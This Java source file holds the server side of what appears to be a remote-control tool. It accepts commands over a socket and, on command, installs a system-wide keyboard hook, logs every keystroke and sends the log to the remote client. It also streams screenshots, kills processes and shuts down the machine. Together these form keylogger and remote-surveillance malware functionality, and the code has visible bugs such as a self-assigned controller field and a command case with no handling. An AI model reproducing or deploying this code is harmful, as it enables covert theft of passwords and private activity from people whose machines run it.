package model;

import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;

import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.GlobalScreen;

import controller.Controller;

import javax.imageio.ImageIO;

public class Server {
    private enum Status {
        STOP,
        RUNNING,
    }
    private ServerSocket serverSock;
    private Socket clientSock;
    private InputStream inputStream;
    private OutputStream outputStream;
    private KeyLogger keyLogger;
    private Controller controller;
    private Status status;
    private boolean isHooked;
    private ScreenShot screenShot;

    public Server(int port, int backlog) {
        this.controller = controller;
        createServerSocket(port, backlog);
        keyLogger = new KeyLogger();

        status = Status.STOP;
        isHooked = false;

        // Register NativeHook for KeyLogger

        try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }

        screenShot = new ScreenShot();
    }

    public void run() {
        status = Status.RUNNING;

        new Thread(new Runnable() {
            public void run() {
                acceptClient();

                while(status == Status.RUNNING) {
                    byte[] buffer = new byte[128];
                    try {
                        inputStream.read(buffer);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    String action = new String(buffer).trim();

                    switch (action) {
                        case ("Hook"):
                        case ("Unhook"):
                        case ("Print"): {
                            handleKeyLogging(action);
                            break;
                        }
                        case ("ScreenShot"):
                        {
                            handleScreenShot(action);
                            break;
                        }

                        case ("ListProcess"):
                        case ("StopProcess"):
                        case ("StartProcess"):
                        {
                            handleProcess(action);
                            break;
                        }

                        case ("ListAppInstalled"):
                        {
                            applicationModel.listAppInstalled();
                            break;
                        }
                        case ("StartAppInstalled"):
                        {
                            applicationModel.startApp();
                            break;
                        }

                        case ("ListAppRunning"):
                        {
                            applicationModel.listAppRunning();
                            break;
                        }
                        case ("StopAppRunning"):
                        {
                            applicationModel.stopAppRunning();
                            break;
                        }

                        case ("Exit"):
                        {
                            status = Status.STOP;
                            break;
                        }

                        case ("Shutdown"):
                        {
                            shutdownModel.handleShutdown();
                            break;
                        }

                        case ("Reset"):
                        {
                            shutdownModel.handleReset();
                            break;
                        }
                    }
                }

                cleanup();
            }
        }).start();

    }

    public void addController(Controller controller) {
        this.controller = controller;
    }

    private void handleProcess(String action)
    {
        notifyController(action);

        switch (action)
        {
            case ("ListProcess"):
            {
                processModel.listProcess();
                break;
            }
            case ("StopProcess"):
            {
                processModel.stopProcess();
                break;
            }
        }
        String line;
    }

    private void handleScreenShot(String action)
    {
        notifyController(action);
        String e = screenShot.takeScreenShot();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        BufferedImage image = screenShot.getImage();
        try
        {
            ImageIO.write(image, "jpg", byteArrayOutputStream);
            outputStream.write(byteArrayOutputStream.toByteArray());
            outputStream.flush();
        }
        catch (IOException ioE)
        {
            ioE.printStackTrace();
        }
    }

    private void handleKeyLogging(String action) {
        notifyController(action);
        switch(action) {
            case ("Hook"): {
                if (!isHooked) {
                    GlobalScreen.addNativeKeyListener(keyLogger);
                    isHooked = true;
                }
                break;
            }
            case ("Unhook"): {
                if (isHooked) {
                    GlobalScreen.removeNativeKeyListener(keyLogger);
                    keyLogger.clearLogs();
                    isHooked = false;
                }
                break;
            }
            case ("Print"): {
                StringBuilder out = new StringBuilder();
                for (int i = 0; i < keyLogger.logs.size(); i++) {
                    out.append(keyLogger.logs.get(i));
                }
                byte[] tmp = out.toString().getBytes();

                try {
                    outputStream.write(tmp);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                break;
            }
        }
    }

    private void notifyController(String action) {
        controller.handleAction(action);
    }

    private void acceptClient() {
        try {
            clientSock = serverSock.accept();
            inputStream = clientSock.getInputStream();
            outputStream = clientSock.getOutputStream();

            processModel = new ProcessModel(inputStream, outputStream);
            applicationModel = new ApplicationModel(inputStream, outputStream);
            shutdownModel = new ShutdownModel();
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void createServerSocket(int port, int backlog) {
        try {
            serverSock = new ServerSocket(port, backlog);
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void cleanup() {
        try {
            GlobalScreen.unregisterNativeHook();
            serverSock.close();
            clientSock.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private ProcessModel processModel;
    private ApplicationModel applicationModel;
    private ShutdownModel shutdownModel;
}
